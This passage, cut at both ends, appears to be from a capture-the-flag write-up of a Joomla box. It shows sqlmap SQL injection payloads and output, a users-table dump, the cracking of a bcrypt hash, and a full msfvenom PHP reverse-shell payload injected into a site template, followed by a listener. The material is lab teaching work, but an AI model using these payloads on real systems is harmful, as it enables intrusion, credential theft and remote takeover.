</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:25<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>WARNING<span style=color:#f92672>]</span> the web server responded with an HTTP error code <span style=color:#f92672>(</span>500<span style=color:#f92672>)</span> which could interfere with the results of the tests
</span></span><span style=display:flex><span>you have not declared cookie<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>, <span style=color:#66d9ef>while</span> server wants to set its own <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;eaa83fe8b963ab08ce9ab7d4a798de05=u77g1e9e2sv...580b9vdo65&#39;</span><span style=color:#f92672>)</span>. Do you want to use those <span style=color:#f92672>[</span>Y/n<span style=color:#f92672>]</span> Y    
</span></span><span style=display:flex><span>sqlmap resumed the following injection point<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> from stored session:
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span>Parameter: list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]</span> <span style=color:#f92672>(</span>GET<span style=color:#f92672>)</span>                                                                                                                                   
</span></span><span style=display:flex><span>    Type: error-based
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0 error-based - Parameter replace <span style=color:#f92672>(</span>FLOOR<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT <span style=color:#ae81ff>8098</span> FROM<span style=color:#f92672>(</span>SELECT COUNT<span style=color:#f92672>(</span>*<span style=color:#f92672>)</span>,CONCAT<span style=color:#f92672>(</span>0x71786a6b71,<span style=color:#f92672>(</span>SELECT <span style=color:#f92672>(</span>ELT<span style=color:#f92672>(</span>8098<span style=color:#f92672>=</span>8098,1<span style=color:#f92672>)))</span>,0x71706b6
</span></span><span style=display:flex><span>271,FLOOR<span style=color:#f92672>(</span>RAND<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>*2<span style=color:#f92672>))</span>x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x<span style=color:#f92672>)</span>a<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Type: time-based blind
</span></span><span style=display:flex><span>    Title: MySQL &gt;<span style=color:#f92672>=</span> 5.0.12 time-based blind - Parameter replace <span style=color:#f92672>(</span>substraction<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    Payload: option<span style=color:#f92672>=</span>com_fields&amp;view<span style=color:#f92672>=</span>fields&amp;layout<span style=color:#f92672>=</span>modal&amp;list<span style=color:#f92672>[</span>fullordering<span style=color:#f92672>]=(</span>SELECT <span style=color:#ae81ff>9257</span> FROM <span style=color:#f92672>(</span>SELECT<span style=color:#f92672>(</span>SLEEP<span style=color:#f92672>(</span>5<span style=color:#f92672>)))</span>iXhJ<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>---
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:28<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> testing MySQL
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> confirming MySQL
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> the back-end DBMS is MySQL
</span></span><span style=display:flex><span>back-end DBMS: MySQL &gt;<span style=color:#f92672>=</span> 5.0.0 <span style=color:#f92672>(</span>MariaDB fork<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> fetching tables <span style=color:#66d9ef>for</span> database: <span style=color:#e6db74>&#39;joomla&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;#__assets&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:29<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;#__associations&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:30<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;#__banner_clients&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>21:26:30<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>INFO<span style=color:#f92672>]</span> retrieved: <span style=color:#e6db74>&#39;#__banner_tracks&#39;</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__user_usergroup_map      |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__usergroups              |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__users                   |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__utf8_conversion         |</span>
</span></span><span style=display:flex><span>| <span style=color:#75715e>#__viewlevels              |</span>
</span></span><span style=display:flex><span>+----------------------------+
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> ending @ 21:26:37 /2020-11-27/
</span></span></code></pre></div><p>With a <code>#__users</code> table now identified, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to provide the columns of the table. Luckily, the schema for the <code>users</code> table for joomla <code>3.7.0</code> was readily available so I created a wordlist using the column names.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# cat table_schema.txt 
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>name
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>email
</span></span><span style=display:flex><span>password
</span></span><span style=display:flex><span>usertype
</span></span><span style=display:flex><span>block
</span></span><span style=display:flex><span>sendEmail
</span></span><span style=display:flex><span>registerDate
</span></span><span style=display:flex><span>lastvisitDate
</span></span><span style=display:flex><span>activation
</span></span><span style=display:flex><span>params
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 auxiliary<span style=color:#f92672>(</span>scanner/http/joomla_version<span style=color:#f92672>)</span> &gt; sqlmap -u <span style=color:#e6db74>&#34;http://10.10.162.223/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> -p <span style=color:#e6db74>&#39;list[fullordering]&#39;</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --random-agent --proxy http://127.0.0.1:8080 --technique<span style=color:#f92672>=</span>TE --dbms<span style=color:#f92672>=</span>MySQL -D joomla -T <span style=color:#e6db74>&#39;#__users&#39;</span> --dumpatexml<span style=color:#e6db74>&#34; -p &#39;list[fullordering]&#39; --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla -T &#39;#__users&#39; --dump
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        ___
</span></span></span><span style=display:flex><span><span style=color:#e6db74>       __H__
</span></span></span><span style=display:flex><span><span style=color:#e6db74> ___ ___[.]_____ ___ ___  {1.4.8#stable}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_ -| . [)]     | .&#39;| . |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>|___|_  [.]_|_|_|__,|  _|
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      |_|V...       |_|   http://sqlmap.org
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] starting @ 21:34:53 /2020-11-27/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:53] [INFO] testing connection to the target URL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:54] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
</span></span></span><span style=display:flex><span><span style=color:#e6db74>you have not declared cookie(s), while server wants to set its own (&#39;eaa83fe8b963ab08ce9ab7d4a798de05=n9efcr7j772...u0vd4k6dr5&#39;). Do you want to use those [Y/n] Y
</span></span></span><span style=display:flex><span><span style=color:#e6db74>sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Parameter: list[fullordering] (GET)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Type: error-based
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Type: time-based blind
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>---
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:56] [INFO] testing MySQL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:56] [INFO] confirming MySQL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:56] [INFO] the back-end DBMS is MySQL
</span></span></span><span style=display:flex><span><span style=color:#e6db74>back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:56] [INFO] fetching columns for table &#39;#__users&#39; in database &#39;joomla&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:34:56] [WARNING] unable to retrieve column names for table &#39;#__users&#39; in database &#39;joomla&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>do you want to use common column existence check? [y/N/q]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:35:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>which common columns (wordlist) file do you want to use?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[1] default &#39;/usr/share/sqlmap/data/txt/common-columns.txt&#39; (press Enter)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[2] custom
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; 2
</span></span></span><span style=display:flex><span><span style=color:#e6db74>what&#39;s the custom common columns file location?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; /root/ctf/table_schema.txt
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:01] [INFO] checking column existence using items from &#39;/root/ctf/table_schema.txt&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:01] [INFO] adding words used on web page to the check list
</span></span></span><span style=display:flex><span><span style=color:#e6db74>please enter number of threads? [Enter for 1 (current)] 4
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:14] [INFO] starting 4 threads
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: id
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: name
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: username
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: email
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: password
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:15] [INFO] retrieved: block
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:16] [INFO] retrieved: sendEmail
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:16] [INFO] retrieved: registerDate
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:16] [INFO] retrieved: lastvisitDate
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:16] [INFO] retrieved: activation
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:16] [INFO] retrieved: params
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] fetching entries for table &#39;#__users&#39; in database &#39;joomla&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;0&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;0&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;jonah@tryhackme.com&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;811&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;2019-12-15 23:58:06&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;Super User&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:23] [INFO] retrieved: &#39;&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] retrieved: &#39;</span>$2<span style=color:#e6db74>y</span>$10$0<span style=color:#e6db74>veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] retrieved: &#39;2019-12-14 20:43:49&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] retrieved: &#39;1&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] retrieved: &#39;jonah&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Database: joomla
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Table: #__users
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[1 entry]
</span></span></span><span style=display:flex><span><span style=color:#e6db74>+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| id  | name       | block | email               | params  | password                                                     | username | sendEmail | activation | registerDate        | lastvisitDate       |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| 811 | Super User | 0     | jonah@tryhackme.com | &lt;blank&gt; | </span>$2<span style=color:#e6db74>y</span>$10$0<span style=color:#e6db74>veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    | 1         | 0          | 2019-12-14 20:43:49 | 2019-12-15 23:58:06 |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] table &#39;joomla.`#__users`&#39; dumped to CSV file &#39;/root/.local/share/sqlmap/output/10.10.162.223/dump/joomla/#__users.csv&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [WARNING] HTTP error codes detected during run:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>500 (Internal Server Error) - 93 times
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[21:36:24] [INFO] fetched data logged to text files under &#39;/root/.local/share/sqlmap/output/10.10.162.223&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>[*] ending @ 21:36:24 /2020-11-27/
</span></span></span></code></pre></div><p>This returned what looked like a valid set of hashed credentials. I decided to run the credentials through <code>john</code> using the rockyou wordlist to see if I could identify the user&rsquo;s password.</p><h3 id=cracking-the-hash>Cracking the hash <a href=#cracking-the-hash class=anchor>üîó</a></h3><p>I ran <code>john</code> with a parallelism of 2 due to my attack host&rsquo;s 2 vcpus and walked away to let this run. Eventually I was lucky to obtain a match.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# john joomla.john --wordlist<span style=color:#f92672>=</span>/usr/share/wordlists/rockyou.txt --fork<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Using default input encoding: UTF-8
</span></span><span style=display:flex><span>Loaded <span style=color:#ae81ff>1</span> password hash <span style=color:#f92672>(</span>bcrypt <span style=color:#f92672>[</span>Blowfish 32/64 X3<span style=color:#f92672>])</span>
</span></span><span style=display:flex><span>Cost <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>iteration count<span style=color:#f92672>)</span> is <span style=color:#ae81ff>1024</span> <span style=color:#66d9ef>for</span> all loaded hashes
</span></span><span style=display:flex><span>Node numbers 1-2 of <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>fork<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Press <span style=color:#e6db74>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#66d9ef>for</span> status
</span></span><span style=display:flex><span>spiderman123     <span style=color:#f92672>(</span>jonah<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span> 1g 0:00:11:10 DONE <span style=color:#f92672>(</span>2020-11-27 21:52<span style=color:#f92672>)</span> 0.001491g/s 34.91p/s 34.91c/s 34.91C/s stargatesg1..speciala
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> 0g 0:00:12:00 DONE <span style=color:#f92672>(</span>2020-11-27 21:53<span style=color:#f92672>)</span> 0g/s 33.61p/s 33.61c/s 33.61C/s hotcake..honey04
</span></span><span style=display:flex><span>Waiting <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>1</span> child to terminate
</span></span><span style=display:flex><span>Use the <span style=color:#e6db74>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style=display:flex><span>Session completeds
</span></span></code></pre></div><p><p class=markdown-image><img src=/images/daily_bugle_http_admin_panel.png alt="daily bugle admin panel"></p></p><p>With these new-found credentials (<code>jonah:spiderman123</code>), I was able to get through to the admin panel. I imediately began clicking around to see if I could find a template or module that I could attempt to inject a shell into.</p><p>Additionally, prior to starting an attack, I decided to start a wordlist of the credentials I was finding. On my first attempt I neglected to maintain a wordlist, this seemed like a small omission at the time but I later found it to have caused me a ton of problems.</p><h4 id=starting-a-wordlist>Starting a Wordlist <a href=#starting-a-wordlist class=anchor>üîó</a></h4><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# mkdir wordlists
</span></span><span style=display:flex><span>root@kali:~/ctf# echo <span style=color:#e6db74>&#39;spiderman123&#39;</span> &gt; wordlists/dailybugle.txt
</span></span></code></pre></div><h3 id=catching-a-shell>Catching a shell <a href=#catching-a-shell class=anchor>üîó</a></h3><p>It wasn&rsquo;t long before I found a path to the template page that I could inject a php shell into and I generated a php payload using meterpreter.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf# msfvenom -p php/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.182.144 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> No arch selected, selecting arch: php from the payload
</span></span><span style=display:flex><span>No encoder specified, outputting raw payload
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>1114</span> bytes
</span></span><span style=display:flex><span>/*&lt;?php /**/ error_reporting<span style=color:#f92672>(</span>0<span style=color:#f92672>)</span>; $ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.182.144&#39;</span>; $port <span style=color:#f92672>=</span> 4444; <span style=color:#66d9ef>if</span> <span style=color:#f92672>((</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream_socket_client&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;tcp://{</span>$ip<span style=color:#e6db74>}:{</span>$port<span style=color:#e6db74>}&#34;</span><span style=color:#f92672>)</span>; $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>(</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;fsockopen&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span>$ip, $port<span style=color:#f92672>)</span>; $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;stream&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>(</span>$f <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;socket_create&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> is_callable<span style=color:#f92672>(</span>$f<span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $s <span style=color:#f92672>=</span> $f<span style=color:#f92672>(</span>AF_INET, SOCK_STREAM, SOL_TCP<span style=color:#f92672>)</span>; $res <span style=color:#f92672>=</span> @socket_connect<span style=color:#f92672>(</span>$s, $ip, $port<span style=color:#f92672>)</span>; <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$res<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> $s_type <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;socket&#39;</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;no socket funcs&#39;</span><span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$s<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;no socket&#39;</span><span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> switch <span style=color:#f92672>(</span>$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;stream&#39;</span>: $len <span style=color:#f92672>=</span> fread<span style=color:#f92672>(</span>$s, 4<span style=color:#f92672>)</span>; break; <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;socket&#39;</span>: $len <span style=color:#f92672>=</span> socket_read<span style=color:#f92672>(</span>$s, 4<span style=color:#f92672>)</span>; break; <span style=color:#f92672>}</span> <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$len<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> die<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> $a <span style=color:#f92672>=</span> unpack<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Nlen&#34;</span>, $len<span style=color:#f92672>)</span>; $len <span style=color:#f92672>=</span> $a<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;len&#39;</span><span style=color:#f92672>]</span>; $b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>; <span style=color:#66d9ef>while</span> <span style=color:#f92672>(</span>strlen<span style=color:#f92672>(</span>$b<span style=color:#f92672>)</span> &lt; $len<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> switch <span style=color:#f92672>(</span>$s_type<span style=color:#f92672>)</span> <span style=color:#f92672>{</span> <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;stream&#39;</span>: $b .<span style=color:#f92672>=</span> fread<span style=color:#f92672>(</span>$s, $len-strlen<span style=color:#f92672>(</span>$b<span style=color:#f92672>))</span>; break; <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;socket&#39;</span>: $b .<span style=color:#f92672>=</span> socket_read<span style=color:#f92672>(</span>$s, $len-strlen<span style=color:#f92672>(</span>$b<span style=color:#f92672>))</span>; break; <span style=color:#f92672>}</span> <span style=color:#f92672>}</span> $GLOBALS<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;msgsock&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $s; $GLOBALS<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;msgsock_type&#39;</span><span style=color:#f92672>]</span> <span style=color:#f92672>=</span> $s_type; <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>extension_loaded<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;suhosin&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> ini_get<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;suhosin.executor.disable_eval&#39;</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span> $suhosin_bypass<span style=color:#f92672>=</span>create_function<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;&#39;</span>, $b<span style=color:#f92672>)</span>; $suhosin_bypass<span style=color:#f92672>()</span>; <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span> eval<span style=color:#f92672>(</span>$b<span style=color:#f92672>)</span>; <span style=color:#f92672>}</span> die<span style=color:#f92672>()</span>;
</span></span></code></pre></div><p><p class=markdown-image><img src=/images/daily_bugle_http_shell_in_template.png alt="daily bugle shell injection"></p></p><p>I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I staged up my listener to catch the incoming shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 auxiliary<span style=color:#f92672>(</span>scanner/http/joomla_version<span style=color:#f92672>)</span> &gt; use mexploit/multi/handler 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; show options
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/multi/handler<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name  Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----  ---------------  --------  -----------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>generic/shell_reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  10.10.182.144    yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>4444</span>             yes       The listen port
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Wildcard Target
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
